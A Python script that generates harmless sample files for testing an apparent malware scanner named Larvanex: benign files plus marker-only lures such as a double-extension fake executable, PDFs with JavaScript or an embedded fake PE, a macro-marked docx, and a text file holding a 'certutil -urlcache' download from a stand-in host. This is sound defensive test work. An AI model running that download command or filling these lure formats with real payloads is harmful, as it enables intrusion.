"""Generate safe, synthetic sample files so you can try Larvanex without
downloading real (dangerous) malware. Run: python samples/generate_samples.py

Everything created here is harmless test data: the "malicious" files only
contain trigger *markers* (magic bytes, keywords), never working code."""

from __future__ import annotations

import io
import os
import zipfile
import zlib

BASE = os.path.dirname(os.path.abspath(__file__))
BENIGN = os.path.join(BASE, "benign")
SUSPICIOUS = os.path.join(BASE, "suspicious")

FIXED_DATE = (2026, 1, 1, 0, 0, 0)

MINIMAL_PDF = b"""%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >> endobj
%%EOF
"""

FAKE_PE = b"MZ" + b"\x00" * 58 + b"PE\x00\x00" + b"\x90" * 200


def _write(folder: str, name: str, data: bytes) -> str:
    os.makedirs(folder, exist_ok=True)
    path = os.path.join(folder, name)
    with open(path, "wb") as handle:
        handle.write(data)
    return path


def _build_zip(members: list[tuple[str, bytes]]) -> bytes:
    """Build a ZIP with fixed timestamps so generated samples are reproducible."""
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, content in members:
            info = zipfile.ZipInfo(name, date_time=FIXED_DATE)
            info.compress_type = zipfile.ZIP_DEFLATED
            archive.writestr(info, content)
    return buffer.getvalue()


def _pdf_with_javascript() -> bytes:
    return b"""%PDF-1.4
1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert('pwned')) >> >> endobj
%%EOF
"""


def _pdf_with_embedded_pe() -> bytes:
    compressed = zlib.compress(FAKE_PE)
    return (
        b"%PDF-1.4\n"
        b"4 0 obj << /Length " + str(len(compressed)).encode() + b" /Filter /FlateDecode >>\n"
        b"stream\n" + compressed + b"\nendstream\nendobj\n%%EOF\n"
    )


def _zip_with_executable() -> bytes:
    return _build_zip([
        ("invoice.txt", b"Please see attached."),
        ("invoice.exe", b"MZ" + b"\x00" * 100),
    ])


def _docx_with_macro() -> bytes:
    return _build_zip([
        ("[Content_Types].xml", b"<Types/>"),
        ("word/document.xml", b"<document>Please enable macros.</document>"),
        ("word/vbaProject.bin", b"\xcc\x61\xff\xffMACRO\x00markers\x00AutoOpen"),
    ])


def main() -> None:
    made = [
        _write(BENIGN, "hello.txt", b"Just a normal text file.\n" * 20),
        _write(BENIGN, "report.pdf", MINIMAL_PDF),
        _write(BENIGN, "notes.zip", _make_benign_zip()),
        _write(SUSPICIOUS, "invoice.pdf.exe", FAKE_PE),
        _write(SUSPICIOUS, "malicious.pdf", _pdf_with_javascript()),
        _write(SUSPICIOUS, "hidden_payload.pdf", _pdf_with_embedded_pe()),
        _write(SUSPICIOUS, "dropper.zip", _zip_with_executable()),
        _write(SUSPICIOUS, "invoice_macro.docx", _docx_with_macro()),
        _write(SUSPICIOUS, "obfuscated.txt", b"powershell -enc " + b"A" * 80 + b"\ncmd.exe /c certutil -urlcache http://evil.example/x"),
    ]
    print("Generated sample files:")
    for path in made:
        print(f"  {os.path.relpath(path, BASE)}")


def _make_benign_zip() -> bytes:
    return _build_zip([
        ("todo.txt", b"buy milk\nwalk dog\n"),
        ("data.csv", b"a,b,c\n1,2,3\n"),
    ])


if __name__ == "__main__":
    main()
